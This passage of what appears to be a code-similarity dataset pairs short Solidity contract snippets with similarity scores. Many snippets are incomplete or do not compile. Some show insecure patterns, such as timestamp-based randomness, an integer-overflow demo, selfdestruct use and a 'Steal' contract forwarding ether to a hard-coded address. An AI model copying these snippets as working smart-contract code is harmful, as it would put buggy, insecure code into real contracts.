        sign[key]=md5;
        return sign[key];
    }

    function getString(uint key) public view returns(string){
        return sign[key];
    }
}"
"contract abc
{
    struct ABC {
        uint a;
        uint b;
        uint c;
    }

    ABC s;

    
    function s_pass() {
        s = ABC({a:1, b:2, c:3});
    }

    
    function s_frm_m_pass() {
        ABC memory m = ABC({a:1, b:2, c:3});
        s = m;
    }
}",0.5264941150783186,"contract dynamictest{

    uint public a;

    uint public b;

    function test(uint foo) public {

        if (tx.gasprice > foo){

            a=1;

            return;

        }

        if (tx.gasprice < foo){

            a=1;

            b=1;

            return;

        }

    }

}"
"contract campaignFactory{
    address[] public deployedCampaigns;

    function createCampaign(uint min) public {
        Campaign newCampaign = new Campaign(min, msg.sender);
        deployedCampaigns.push(address(newCampaign));
    }

    function getDeployedCampaigns() public view returns (address[] memory){
        return deployedCampaigns;
    }
}",0.5635996047135277,"contract owned {

    address public owner;



    constructor() public {

        owner = msg.sender;

    }



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    function transferOwnership(address newOwner) onlyOwner public {

        owner = newOwner;

    }



    function getOwned() onlyOwner public view returns (address) {

        return owner;

    }

}"
"contract mycontract{

    struct userData {
        string lastName;
        string name;
    }


    mapping(uint => userData) private costumers;

    function  setUserData(string _lastname, string _name, uint256 _id) public{
        costumers[_id].lastName = _lastname;
        costumers[_id].name = _name;
    }

    function  getUserData(uint256 _id) public view returns (string, string) {
        return (costumers[_id].lastName,costumers[_id].name);
    }

}",0.5918864835316944,"contract Marcela_Birthday {


string public name ;

string public date;

string public hour;

string public local;


function Marcela_Birthday(string _name, string _date, string _hour ,string _local){
name = _name;
date = _date;
hour = _hour;
local = _local;
}


function getinfo () public constant returns (string,string,string,string) {
    
 return(name,date,hour,local);
}
}"
"contract Testing{

    struct personalInfo {
        uint id;
        string[] colors;
        bool player;
    }

    mapping(uint=> personalInfo) public personals;
    constructor () public {

    }    function updatePersonalInfo(uint _ID, string  memory _color, bool _player) public {
        personalInfo storage updateP = personals[_ID];
        updateP.id = _ID;
        updateP.player = _player;
        updateP.colors.push(_color);
    }
    function rPersonalInfo(uint id)public view returns(personalInfo memory p){
        return personals[id];
    }
}",0.5553582709079106,"contract Park is MintableToken {
    string public name = ""parkyoonst"";
    string public symbol = ""ystp"";
    uint8 public decimals = 0;
    uint public INITIAL_SUPPLY = 0;

    constructor () public {
    }

    event memo(string _memo);

    function mintWithMemo(string _memo, address _to, uint256 _amount) public {
        mint(_to, _amount);
        emit memo(_memo);
    }
    
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(msg.sender == owner);
        super.transfer(_to, _value);
    }
}"
"contract BetslipFactory{
  mapping (address => Betslip) betslipMapping;

  function newBetSlip(uint _stake, address _opponent) {
    Betslip b = new Betslip(_stake, _opponent);
    betslipMapping[address(b)] = b;
  }

  function getBetSlipData(address _betslip) constant returns (address,uint8,address){

    Betslip b = betslipMapping[_betslip];
    return (address(b),b.getStake(),b.getOpponent());
  }

}",0.5519689047012101,"contract Metadata {
    mapping (address => mapping (address => mapping (string => string))) metadata;

    function put(address _namespace, string _key, string _value) public {
        metadata[_namespace][msg.sender][_key] = _value;
    }

    function get(address _namespace, address _ownerAddress, string _key) public constant returns (string) {
        return metadata[_namespace][_ownerAddress][_key];
    }
}"
"contract XYZ{
  address ceoAddress, cooAddress, contractCreator;
  function XYZ(address _ceo, address _coo) public { 
   contractCreator = msg.sender;
   ceoAddress = _ceo;
   cooAddress = _coo;
 }
}",0.5725344416896831,"contract CreatorEnabled {



    address public creator = 0x0;



    modifier onlyCreator() { require(msg.sender == creator); _; }



    function changeCreator(address _to) public onlyCreator {

        creator = _to;

    }

}"
"contract extractDigits{
    uint8[] digits;

    function generateDigits() public returns(uint){
        delete digits;
        uint number = uint(keccak256(abi.encodePacked(now)));
        uint returnNum = number;
        while (number > 0) {
            uint8 digit = uint8(number % 10);
            number = number / 10;
            digits.push(digit);
        }

        return returnNum;
    }

    function getDigit(uint x) public view returns (uint8) {
        return digits[x];
    }
}",0.5703866446039279,"contract RNG{



    

    function contribute(uint _block) public payable;



    

    function requestRN(uint _block) public payable {

        contribute(_block);

    }



    

    function getRN(uint _block) public returns (uint RN);



    

    function getUncorrelatedRN(uint _block) public returns (uint RN) {

        uint baseRN = getRN(_block);

        if (baseRN == 0)

        return 0;

        else

        return uint(keccak256(msg.sender,baseRN));

    }



}"
"contract BiddingContract
{
    
    struct Bid {
        address user;
        uint bidAmount;
    }

    
    
    Bid[] AllBids;

    
    constructor() public {
        AllBids.push(Bid(0x0, 0));
    }

    
    function submitBid(uint _bidPrice) public {
        
        uint lastIndex = AllBids.length - 1;
        
        require(_bidPrice > AllBids[lastIndex].bidAmount);
        
        AllBids.push(Bid(msg.sender, _bidPrice));
    }

    
    function getTopBid() public view returns (address, uint) {
        uint lastIndex = AllBids.length - 1;

        return (AllBids[lastIndex].user, AllBids[lastIndex].bidAmount);
    }

    
    
    function getNumberOfBids() public view returns (uint) {
        return AllBids.length;
    }

    
    
    function getBid(uint index) public view returns (address, uint) {
        return (AllBids[index].user, AllBids[index].bidAmount);
    }
}",0.5919122589784449,"contract ERC918Interface {

  function totalSupply() public constant returns (uint);

  function getMiningDifficulty() public constant returns (uint);

  function getMiningTarget() public constant returns (uint);

  function getMiningReward() public constant returns (uint);

  function balanceOf(address tokenOwner) public constant returns (uint balance);

  function merge() public returns (bool success);

  uint public lastRewardAmount;



  function mint(uint256 nonce, bytes32 challenge_digest) public returns (bool success);



  event Mint(address indexed from, uint reward_amount, uint epochCount, bytes32 newChallengeNumber);



}"
"contract test{
    function numFromHash(string input, uint range) public pure returns(uint) {
        return uint(keccak256(abi.encodePacked(input))) % range;
    }
}",0.5853257242360963,"contract FiatContract {
  function USD(uint _id) public view returns (uint256);
  function updatedAt(uint _id) public view returns (uint);
}"
"contract Votinggame{
  struct Vote {
    address voter;
    string comment;
  }

  struct Project{
    uint256 id;
    string name;
    uint256 votes;
    uint256[] voteArr;
  }

  Project[] public projects;
  Vote[] public votes;

  uint256 projectCounter = 0;
  uint256 voteCounter = 0;

  function addNewProject(string name) public {
    projects.push(Project({
      id: projectCounter,
      name: name,
      votes: 0,
      voteArr: new uint256[] (0)
    }));

    projectCounter += 1;
  }

  function vote(uint index , string comment) public {
    Vote memory v;
    v.voter = msg.sender;
    v.comment = comment;
    votes.push(v);

    projects[index].votes += 1;
    projects[index].voteArr.push(voteCounter);

    voteCounter += 1;
  }
}",0.5564375923721928,"contract ItemBase is Ownable {

    using SafeMath for uint;



    struct Item {

        string name;

        string itemType;

        string size;

        string color;

        

        uint128 price;

    }



    uint128 MAX_ITEMS = 1;

    

    Item[] items;



    

    mapping(uint => address) public itemIndexToOwner;



    

    

    mapping (address => uint) public ownershipTokenCount;



    

    

    

    mapping (uint => address) public itemIndexToApproved;





    function getItem( uint _itemId ) public view returns(string name, string itemType, string size, string color, uint128 price) {

        Item memory _item = items[_itemId];



        name = _item.name;

        itemType = _item.itemType;

        size = _item.size;

        color = _item.color;

        price = _item.price;

    }

}"
"contract MetaCoin{
    mapping (address => string) student_hashes;
    function sendHash(address student_id, string hash_value) returns(bool sufficient)  { 
        student_hashes[student_id] = hash_value;        
        return true; 
    }
    function getHash(address student_id) constant returns(string hash)  {       
        return student_hashes[student_id]; 
    }
}",0.5654335068816526,"contract RobetTest {

    string public name;

    mapping (address => mapping (string => uint256)) private bets;

    constructor()  public {

        name = 'RobetTest';

    }

    function insertBet(string memory bid, address addr, uint256 _value) public returns (bool success) {

        bets[addr][bid] = _value;

        return true;

    }

}"
"contract Ballot{

    function giveRightToVote(address voter) {
        if (msg.sender != chairperson || voters[voter].voted) {
            throw;
        }
        voters[voter].weight = 1;
    }
}",0.5690755746288774,"contract Vote {
    event LogVote(address indexed addr);

    function() {
        LogVote(msg.sender);

        if (msg.value > 0) {
            if (!msg.sender.send(msg.value)) {
                throw;
            }
        }
    }
}"
"contract Arrays{

    
    bool[2][] flags;

    function Arrays() {
        
        flags.push([true,true]);
    }

    function appendFlag() returns(uint length) {
       
       return flags.push([true,true]);
    }

    
    
    function getFlags(uint index) constant returns(bool[2] flagList) {
        return(flags[index]);
    }

    
    function getFlag(uint dynamicIndex, uint lengthTwoIndex) constant returns(bool flag) {
        return flags[dynamicIndex][lengthTwoIndex];
    }

    
    function getFlagsCount() constant returns(uint count) {
        return flags.length;
    }

}",0.5805594290845479,"contract IToken { 

    
    function totalSupply() constant returns (uint);


    
    function balanceOf(address _owner) constant returns (uint);


    
    function transfer(address _to, uint _value) returns (bool);


    
    function transferFrom(address _from, address _to, uint _value) returns (bool);


    
    function approve(address _spender, uint _value) returns (bool);


    
    function allowance(address _owner, address _spender) constant returns (uint);
}"
"contract Tweet{
   event Msg (string msg);

   function makeTweet(string _msg) public {
      Msg (_msg);
   }  
}",0.5896008986738832,"contract Foo
{
    string public phrase;
    
    function Foo(string _phrase) public {
        phrase = _phrase;
    }
}"
"contract A{

    address public seller; 

    function A(){
        seller = 0xdd870fa1b7c4700f2bd7f44238821c26f7392148;
 }

    function transfer_from_B(address b){
        b.transferBalance(seller)
    }
}",0.5823060248126845,"contract ERC20_Transferable {
    function balanceOf(address addr) public returns(uint);
    function transfer(address to, uint value) public returns (bool);
}"
"contract Test{
   string data;
   uint stringLimit;

   function setVariable(string str)  {
      bytes memory strBytes = bytes(str);
      if(strBytes.length >= stringLimit)
          revert;
      else 
         data = str;
    }
}",0.5629121807956635,"contract SHA256Digest is Digest {

    using BytesUtils for *;



    function verify(bytes data, bytes hash) external pure returns (bool) {

        return sha256(data) == hash.readBytes32(0);

    }

}"
"contract Notary{
    struct Document {
        uint timestamp;
        bytes ipfs_hash;
        address[] signatures;
    }
    mapping(address => bytes[]) public users; 
    mapping(bytes32 => Document) public documents; 

    function addDocument(bytes ipfs) public {
        users[msg.sender].push(ipfs); 
        address[] memory sender;
        sender[sender.length++] = msg.sender;
        documents[sha3(ipfs)] = Document(block.timestamp, ipfs, sender);
    }

    function signDocument(bytes ipfs) public {
        users[msg.sender].push(ipfs);
        documents[sha3(ipfs)].signatures.push(msg.sender);
    }

}",0.5544139237539973,"contract MerklIO {

    address public owner = msg.sender;

    mapping(bytes32 => uint256) public hashToTimestamp; 

    mapping(bytes32 => uint256) public hashToNumber; 

    

    event Hashed(bytes32 indexed hash);

    

    function store(bytes32 hash) external {

         

        assert(msg.sender == owner);

        

        

        assert(hashToTimestamp[hash] <= 0);

    

        

        hashToTimestamp[hash] = block.timestamp;

        hashToNumber[hash] = block.number;

        

        

        emit Hashed(hash);

    }

    

    function changeOwner(address ownerNew) external {

        

        assert(msg.sender == owner);

        

        

        owner = ownerNew;

    }

}"
"contract MyContract{
    struct MyStruct {...}
    function MyContract(bytes32[23] input) {
        MyStruct(input[0],input[1],...}
    }",0.5300310078891964,"contract OmegaContract {
    bool public isOmegaContract = true;

    function OmegaContract() public {

    }
}"
"contract Child{

    uint8 public age = 1;


    function birthDay() { <-- gas used: 26933 
        age = age + 1;
    }

    function nextYearIllBe() constant returns (uint8){
        return age + 1;
    }


    function newBirthDay() { <-- gas used 26991
        age = nextYearIllBe();
    }
}",0.5662494259707229,"contract DateTime {
        function getYear(uint timestamp) public constant returns (uint16);
        function getMonth(uint timestamp) public constant returns (uint8);
        function getDay(uint timestamp) public constant returns (uint8);
}"
"contract AutoPayment{
  
  address target_address = 0x45fB94ab5E7090A1145D988a1041144c74C66BEc;

  
  function () payable public {
    target_address.transfer(this.balance);
  }   
}",0.5474816816769553,"contract mile{

     function receiveEther() payable public{
     }

     function sendEther(address _address) payable public{
         uint value = 0;

         _address.transfer(value);
     }

}"
"contract ObjectFactory{

    function createObject() returns(address){
        Object subObject = new Object();
        return subObject;
    }

}",0.5604454162971488,"contract B {

    function newA() public returns(address) {

        A newInstance = new A();

        return address(newInstance);

    }

}"
"contract Object{
    function createSubObject(ObjectFactory factory) returns(address) {
        address objectAddress = factory.createObject();
        return ObjectAddress; 
    }
}",0.5578889038454266,"contract abcResolverI{

    function getWalletAddress() public view returns (address);

    function getAddress() public view returns (address);

}"
"contract MyGame{
    function ShowScore(string name) public view returns (int) {
        IScoreStore scoreStore = IScoreStore(0xEB058f7E140991811ff815335DA5bB7e593c8359);
        return scoreStore.GetScore(name);
    }
}",0.5030053545061579,"contract Trusti {
    string data = ""trusti.id"";
    
    function getStore() public view returns (string memory) {
        return data;
    }
    
    function setStore(string memory _value) public {
        data = _value;
    }
}"
"contract oldContract{

  mapping(address => uint256) oldAccounts;
  mapping(uint256 => address) public accountSequence;
  
  mapping(address => bool) registered;

  address[] listOfAddresses;
  uint256 public numberOfAccounts = 0;

  function registerAccount(address user) public {
    
    require(!registered[user]);
    accountSequence[numberOfAccounts++] = user;
    listOfAddresses.push(user);
    registered[user] = true;
  }
}",0.5947463244272119,"contract BtradeWhiteList {
	mapping(address => bool) public whiteList;
	
	function BtradeWhiteList() public {
	
	}
	
	function register(address _address) public {
        whiteList[msg.sender] = true;
    }

    function unregister(address _address) public {
        whiteList[msg.sender] = false;
    }

    function isRegistered(address _address) public view returns (bool registered) {
        return whiteList[_address];
    }
}"
"contract Client{
    Server public server;
    function Client(address _server) {
        server = Server(_server);
    }
    function doit(){
        server.homicide();
        throw;
    }
}",0.5943480205847841,"contract Mortal {
        address public owner;
        function mortal() { owner = msg.sender; }
        function kill() { if (msg.sender == owner) suicide(owner); }
}"
"contract ScoreStore{
    mapping(string => uint) PersonScores;

    function AddPersonScore(string name, uint startingScore) public {
        require(PersonScores[name]>0);
        PersonScores[name] = startingScore;
    }

    function GetScore(string name) public view returns (uint){
        return PersonScores[name];
    }
}",0.5808108563222733,"contract DocumentHash {

    mapping(string => uint) hashToTimestamp;

    

    function write(string memory hash) public {

        require(hashToTimestamp[hash] == 0);

        

        hashToTimestamp[hash] = now;

    }

    

    function getTimestamp(string memory hash) public view returns(uint) {

        return hashToTimestamp[hash];

    }

}"
"contract StorageContract{

    struct User {
        string email;
        string userName;
    }

    mapping(address=>User) mappingToUser;

    address[] public ContractsAdresses;

    function savePersonalInfo(string Name, string Email, address Addr) public {
        mappingToUser[Addr].email = Email;
        mappingToUser[Addr].userName = Name;
        ContractsAdresses.push(Addr);
    }
}",0.5655197769982779,"contract ComponentContainerInterface {

    mapping (string => address) components;



    event ComponentUpdated (string _name, address _componentAddress);



    function setComponent(string _name, address _providerAddress) internal returns (bool success);

    function getComponentByName(string name) public view returns (address);



}"
"contract Coin2{
        Coin1 coin;
        function setcoin(address addr) { coin= Coin1(addr); }
        function callcoin() { coin.f.value(10).gas(800)(); 
    }",0.549415860488936,"contract OperatableBasic {

    function setMinter (address addr) external;

    function setWhiteLister (address addr) external;

}"
"contract first{

    struct dataStruct {
        uint value;
        address addr;
    }

    dataStruct public data1;
    dataStruct public data2;

    constructor() public {
        data1.addr = msg.sender;
        data1.value = 7;
    }

    function passdata(address ic) public {
        first r = first(ic);
        r.recdata(data1);
    }


    function recdata(dataStruct data) public returns (uint, address) {
        data2.addr = data.addr;
        data2.value = data.value;
    }

}",0.5918885759658502,"contract Token {
    function balanceOf(address _owner) constant public returns (uint balance);
    function allowance(address _user, address _spender) constant public returns (uint amount);
    function transfer(address _to, uint _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint _value) public returns (bool success);
}"
"contract A {
    event myLog(bool indexed success);
    function mySend(address B, uint y){
        var success = B.send(y);
        myLog(success);
    }
}",0.5948798712567739,"contract Burnable {

  function burn(uint256 value) public returns (bool);

  event Burn(address indexed from, uint256 value);

}"
"contract Inbox{
    string public message;

    constructor (string memory initialMessage) public{
        message = initialMessage;
    }

    function setMessage(string memory newMessage) public{
        message = newMessage;
    }
}",0.5752367552124692,"contract SimpleStorage {

    string public welcomeMsg = ""Hello block chain from InfPro IT Solutions!"";

    string[] public myStorage;

    

    function add(string _store) public {

        myStorage.push(_store);

    }

}"
"contract students{

struct Students{
    string fname;
    string lname;
    string course;      
}

mapping (address => Students) studentsMappig;

address[] public studentsArray;

function setStudents(address _address, string _fname, string _lname,string _course) public{

    Students storage student = studentsMappig[_address];

    student.fname = _fname;
    student.lname = _lname;
    student.course = _course;
    studentsArray.push(_address);

}

}",0.5348586198803881,"contract UserName {



  mapping (address => mapping (uint => string)) public userDict;



  event OnNameChanged(uint indexed _guid, address indexed _who, string _newName);



  function changeName(uint _guid, string _newName) public {

    userDict[msg.sender][_guid] = _newName;

    OnNameChanged(_guid, msg.sender, _newName);

  }



  function nameOf(uint _guid, address _who) view public returns (string) {

    return userDict[_who][_guid];

  }

}"
"contract ShippingInterface {
  function shipStuff(bytes32 itemId, uint qty, bytes32 streetAddressId) public returns(bytes32 waybillId);
}",0.5929493297357711,"contract Bytes32 {

    function _bytes32(string _input) internal pure returns(bytes32 result) {

        assembly {

            result := mload(add(_input, 32))

        }

    }

}"
"contract Store {

  ShippingInterface s;
  ...
}",0.5857703890738822,contract ERC20 is ERC20Interface {}
"contract MerkleProof {
  function verify(
    bytes32 root,
    bytes32 leaf,
    bytes32[] proof,
    uint256[] positions
  )
    public
    pure
    returns (bool)
  {
    bytes32 computedHash = leaf;

    for (uint256 i = 0; i < proof.length; i++) {
      bytes32 proofElement = proof[i];

      if (positions[i] == 1) {
        computedHash = keccak256(abi.encodePacked(computedHash, proofElement));
      } else {
        computedHash = keccak256(abi.encodePacked(proofElement, computedHash));
      }
    }

    return computedHash == root;
  }
}",0.5397747556038252,"contract SimplePrize {
    bytes32 public constant salt = bytes32(987463829);
    bytes32 public commitment;

    function SimplePrize(bytes32 _commitment) public payable {
        commitment = _commitment;   
    }

    function createCommitment(uint answer) 
      public pure returns (bytes32) {
        return keccak256(salt, answer);
    }

    function guess (uint answer) public {
        require(createCommitment(answer) == commitment);
        msg.sender.transfer(this.balance);
    }

    function () public payable {}
}"
"contract Sample {
     string constant statictext = ""Hello"";
     bytes32 constant statictext1 = ""Hello"";
    function  getStatictextasString() constant public  returns(string){
        return statictext;
    }

     function  getStatictextasBytes() constant public returns(bytes32){
        return statictext1;
    }
}",0.5694282494368721,"contract ERC223 is ERC20 {



    function name() constant returns (string _name);

    function symbol() constant returns (string _symbol);

    function decimals() constant returns (uint8 _decimals);



    function transfer(address to, uint256 value, bytes data) returns (bool);



}"
"contract ReplicatorB {

    address creator;
    uint blockCreatedOn;

    function Replicator() 
    {
        creator = msg.sender;
       
                         
                         
        blockCreatedOn = block.number;
    }

  function getBlockCreatedOn() constant returns (uint)
  {
    return blockCreatedOn;
  }

    

    function kill()
    { 
        if (msg.sender == creator)
        {
            suicide(creator);  
        }
    }
}",0.5908690409631329,"contract ProofOfExistence {



    uint topTimeBeat;

    address owner;



    constructor() public {

       owner = msg.sender;

    }



    function publishTopTimeBeat(uint _topTimeBeat) public {

        if (owner == msg.sender) {

            topTimeBeat = _topTimeBeat;

        }

    }



    function get() public view returns (uint) {

        return topTimeBeat;

    }

}"
"contract IOT {

    uint public temperature;
    address sensor;
    address led;

    event Instruction( address device, string instruction)

    function IOT (address _sensor, address LED ){
        sensor = _sensor;
        led = LED;
    }

    function updateTemp(uint temp){
        if(msg.sender != sensor) throw;
        temperature = temp;
        if (temperature > 60) {
            Instruction(led, ""ON"");
        {
        else Instruction (led,""OFF"");
    }
}
",0.5819660640048345,"contract ERC20 is ERC20Basic {

  function allowance(

    address owner,

    address spender) public view returns (uint);

  function transferFrom(

    address from,

    address to,

    uint value

  )

    public returns (bool);

  function approve(address spender, uint value) public returns (bool);

  event Approval(address indexed owner, address indexed spender, uint value);

}"
"contract parseBytes {
  bytes test = ""\x20\x00\x10\x10\x10"";
  function f(){
    bytes32 adr;
    assembly{
        adr := sha3(0, 32)
    }
  }
}",0.5601715908162456,"contract CodeHash {
    function soul(address usr) public view returns (bytes32 tag)
    {
        assembly { tag := extcodehash(usr) }
    }
}"
"contract A {
    function makeCall(address addressB){
         if (!addressB.call.gas(0).value(1 ether)(bytes4(sha3(""getX()"")))) {
             throw;
         }
    }
}",0.5365592560208164,"contract Authority {
    function canCall(address src, address dst, bytes4 sig) constant returns (bool);
}"
"contract StructSerialization
{
    function StructSerialization()
    {
    }

    event exactUserStructEvent(uint32 id, string name);

    
    struct ExactUserStruct
    {
        uint32 id;
        string name;
    }

    function showStruct(ExactUserStruct u) private
    {
        exactUserStructEvent(u.id, u.name);
    }


    function exactUserStructToBytes(ExactUserStruct u) private
    returns (bytes data)
    {
        
        uint _size = 4 + bytes(u.name).length;
        bytes memory _data = new bytes(_size);

        uint counter=0;
        for (uint i=0;i<4;i++)
        {
            _data[counter]=byte(u.id>>(8*i)&uint32(255));
            counter++;
        }

        for (i=0;i<bytes(u.name).length;i++)
        {
            _data[counter]=bytes(u.name)[i];
            counter++;
        }

        return (_data);
    }


    function exactUserStructFromBytes(bytes data) private
    returns (ExactUserStruct u)
    {
        for (uint i=0;i<4;i++)
        {
            uint32 temp = uint32(data[i]);
            temp<<=8*i;
            u.id^=temp;
        }

        bytes memory str = new bytes(data.length-4);

        for (i=0;i<data.length-4;i++)
        {
            str[i]=data[i+4];
        }

        u.name=string(str);
     }

    function test()
    {
        
        ExactUserStruct memory struct_1=ExactUserStruct(1234567,""abcdef"");
        showStruct(struct_1);

        
        bytes memory serialized_struct_1 = exactUserStructToBytes(struct_1);

        
        ExactUserStruct memory struct_2 = exactUserStructFromBytes(serialized_struct_1);

        
        showStruct(struct_2);
    }
}",0.5165692937971766,"contract SkillChain {

  struct UserStruct {
    string skillData;
   
    uint index;
  }
  
  mapping(uint256 => UserStruct) private userStructs;
  uint256[] private userIndex;

  event LogNewUser   (uint256 indexed skillId, uint index, string skillData);
  
  
  function isUser(uint256 skillId)
    public 
    constant
    returns(bool isIndeed) 
  {
    if(userIndex.length == 0) return false;
    return (userIndex[userStructs[skillId].index] == skillId);
  }

  function insertUser(
    uint256 skillId, 
    string skillData) 
    public
    returns(uint index)
  {
    if(isUser(skillId)) throw; 
    userStructs[skillId].skillData = skillData;
    
    userStructs[skillId].index     = userIndex.push(skillId)-1;
    LogNewUser(
        skillId, 
        userStructs[skillId].index, 
        skillData);
    return userIndex.length-1;
  }

  
  
  function getUser(uint256 skillId)
    public 
    constant
    returns(string skillData,  uint index)
  {
    if(!isUser(skillId)) throw; 
    return(
      userStructs[skillId].skillData, 
      userStructs[skillId].index);
  } 
  
     
  function getUserCount() 
    public
    constant
    returns(uint count)
  {
    return userIndex.length;
  }

  function getUserAtIndex(uint index)
    public
    constant
    returns(uint256 skillId)
  {
    return userIndex[index];
  }

}"
"contract Gas {

    
    struct IdStruct { 
        uint128 id;                 
        uint32  value;             
        uint32  field2;
        uint64  padding;
    }


    uint128 [] itemIds;
    mapping (uint128 => IdStruct) items",0.5421019775278361,"contract Jug {
    struct Ilk {
        uint256 duty;
        uint256  rho;
    }

    mapping (bytes32 => Ilk) public ilks;

    function drip(bytes32) public returns (uint);
}"
"contract omega {
mapping (uint => uint[3]) public GPS;

function omega(uint[] coords) public{
    uint x = uint(coords.length)/uint(3);
    uint cont = 0;
    for(uint r = 0; r<x;r++){
        setXYZ(r,coords[cont],coords[cont+1],coords[cont+2]);
        cont+=2;
    }
}

function setXYZ(uint index, uint _x,uint _y,uint _z) public{
    setX(index,_x);
    setY(index,_y);
    setZ(index,_z);
}

function setX(uint index,uint _value){
    GPS[index][0] = _value;
}
function setY(uint index,uint _value){
    GPS[index][1] = _value;
}
function setZ(uint index,uint _value){
    GPS[index][2] = _value;
}
}",0.5469140778185335,"contract I_Pricer {
    uint128 public lastPrice;
    uint public constant DELAY = 1 days;
    I_minter public mint;
    string public sURL;
    mapping (bytes32 => uint) RevTransaction;
    function setMinter(address _newAddress) {}
    function __callback(bytes32 myid, string result) {}
    function queryCost() constant returns (uint128 _value) {}
    function QuickPrice() payable {}
    function requestPrice(uint _actionID) payable returns (uint _TrasID){}
    function collectFee() returns(bool) {}
    function () {
        
        revert();
    }
}"
"contract PatientRecords {

struct Patient {
    string name;
    string ID;
    uint weight;
    uint height;
}

address doctor;

constructor() public {
    doctor = msg.sender;
}

modifier onlydoctor() {
    if (msg.sender == doctor) {
        _;
    }
} 

Patient[] public patients;

function registerPatient(
    string _name, 
    string _ID, 
    uint _weight, 
    uint _height) public onlydoctor {
        patients.push(Patient(_name, _ID, _weight, _height));
    }
}",0.5707780850937579,"contract ITGCToken is StandardToken {

    string  public name = ""Itgolds"";

    string  public symbol = ""ITGC"";

    uint8   public decimals = 8;

    uint    public totalSupply = (20 * 10 ** 8 + 50) * 10 ** 8;

    constructor() public {

        balances[msg.sender] = totalSupply;

    }



    function setName(string _name) public onlyOwner {

    	name = _name;

    }



    function setSymbol(string _symbol) public onlyOwner {

    	symbol = _symbol;

    }

}"
"contract Divide {

  function percent(uint numerator, uint denominator, uint precision) public 

  constant returns(uint quotient) {

         
        uint _numerator  = numerator * 10 ** (precision+1);
        
        uint _quotient =  ((_numerator / denominator) + 5) / 10;
        return ( _quotient);
  }

}",0.5907248157450264,"contract showNum {
    address owner = msg.sender;
    uint _num = 0;
    constructor(uint number) public {
        _num = number;
    }
    function setNum(uint number) public payable {
        _num = number;
    }
    function getNum() constant public returns(uint) {
        return _num;
    }
}"
"contract PercentageEther{

    
    address payable target = 0x158de12EE547EAe06Cbdb200A017aCa6B75D230D;

    
    function () payable external{
        
        target.transfer(msg.value/100);

        
    }

}",0.5829749789646312,"contract CYBRPurchaseAddress {



	address public wallet = 0x22C19409BB811FcfD2c575F24f21D7D5a6174DB1;



	function () external payable {

		wallet.transfer(msg.value);

	}

}"
"contract AddOrRemoveAdminVotingBuilder{
    event NewContract(address contractAddress);

    function build(
        address pPlatform,
        address pAdminManager
    )
        external
    {
        emit NewContract(address(
            new AddOrRemoveAdminVoting(
                pPlatform, 
                pAdminManager
            )
        ));
    }
}",0.5505198339052471,"contract TombAccessControl {

    address public ownerAddress;



    modifier onlyOwner() {

        require(msg.sender == ownerAddress);

        _;

    }



    function withdrawBalance() external onlyOwner {

        address contractAddress = this;

        ownerAddress.transfer(contractAddress.balance);

    }

}"
"contract Steal 
{
    address thief = 0x42b12454ea6163ad77b6af71cd90fc60421fef5a;


    function () payable 
    {
        thief.send(msg.value);
    }

 }",0.5013234024380203,"contract SuicideContract{
    function NukeContract(address Russian) payable {
        (new LetsSuicide).value(msg.value)(Russian);
    }
}"
"contract AssemblyArray {

    function getFirstArray(bytes _array) 
        public
        returns (uint[]) {
        assembly {
            
            let ptr := msize()
            
            let size := mload(add(_array, 0x40)) 
            
            let offset := 0x60
            
            let idx := 0

            
            mstore(ptr, 0x20)
             
            mstore(add(ptr,0x20), size)

            
            jumpi(_ret, eq(0, size))

            _add:
            
            mstore(add(ptr,add(0x40,mul(0x20,idx))), mload(add(offset, mul(0x20, idx))) )

            
            idx := add(idx, 1)
            
            jumpi(_add, lt(idx, size))

            _ret:
            return(ptr, mul(add(size, 2), 0x20))
        }    
    }
}",0.5917436432700869,"contract Proxy {

    

    

    function implementation() public view returns (address);



    

    function() external payable {

        address _impl = implementation();

        

        assembly {

            let ptr := mload(0x40)

            calldatacopy(ptr, 0, calldatasize)

            let result := delegatecall(gas, _impl, ptr, calldatasize, 0, 0)

            let size := returndatasize

            returndatacopy(ptr, 0, size)



            switch result

            case 0 { revert(ptr, size) }

            default { return(ptr, size) }

        }

    }

}"
"contract CrowdSale {
    mapping (address=>uint) contributors;
    function GetContributors(address addr) returns(uint)
    {
    return contributors[addr];
    }
    }",0.593477555190843,"contract GemLike {
    function transferFrom(address,address,uint) external returns (bool);
    function approve(address,uint) external returns (bool);
}"
"contract Inherit is IF {
    Inherit() public; 
}",0.5716802957241679,"contract Empty {
 uint public value = 5;
}"
"contract Sink {
    event Received(address, uint);
    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
}",0.5962537955282851,"contract Context {
    
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}"
"contract ReceiveOnEvenSeconds {
    function() external payable {
        require(now % 2 == 0, ""I only receive ether on even seconds."");
    }
}",0.5805733126939749,"contract Switchable is Stoppable {



  function switchOn() external onlyOwner {

    if (!isOn) {

      isOn = true;

      emit On();

    }

  }

  event On();

}"
"contract CappedCrowdsale is Crowdsale{
    ...
}",0.5683149328464662,"contract AssembledCommonSale is CommonSale {

}"
"contract StorageTest {
    uint256 a;     
    uint256[2] b;  

    struct Entry {
        uint256 id;
        uint256 value;
    }
    Entry c;       
    Entry[] d;
}",0.5990746110185339,"contract JugLike {
    
    struct Ilk {
        uint256 duty;
        uint256  rho;
    }

   mapping (bytes32 => Ilk) public ilks;
   uint256 public base;
}"
"contract WithdrawDAO {
    DAO constant public mainDAO = DAO(0x5c40ef6f527f4fba68368774e6130ce6515123f2);
    ...

    function withdraw(){
        uint balance = mainDAO.balanceOf(msg.sender);

        if (!mainDAO.transferFrom(msg.sender, this, balance) || !msg.sender.send(balance))
            throw;
    }
    ...
}",0.534145604270048,"contract YBalanceChecker {

    function check(address token) external view returns(uint a, uint b) {

        if (uint(token)==0) {

            b = msg.sender.balance;

            a = address(this).balance;

            return;

        }

        b = Yrc20(token).balanceOf(msg.sender);

        a = Yrc20(token).allowance(msg.sender,this);

    }

}"
"contract Overflow {
    uint8 iWantToBeCrossed;

    function OverflowMe() public
    {
        iWantToBeCrossed = 100;
        iWantToBeCrossed += 200;

    }

    function ShowMeTheValue () public   view returns (uint8){
        return iWantToBeCrossed;
    }
}",0.5761546979316101,"contract tokenInterface {
	function balanceOf(address _owner) public view returns (uint256 balance);
	function transfer(address _to, uint256 _value) public returns (bool);
    uint8 public decimals;
}"
"contract TokenA {
{


contract B {
   TokenA token

   contructor(address _token) {
      token = TokenA(_token);
   }

}",0.5437992212349758,"contract Token {

  function transfer(address to, uint tokens) public returns (bool success);

}"
"contract B {
   TokenA token

   contructor(address _token) {
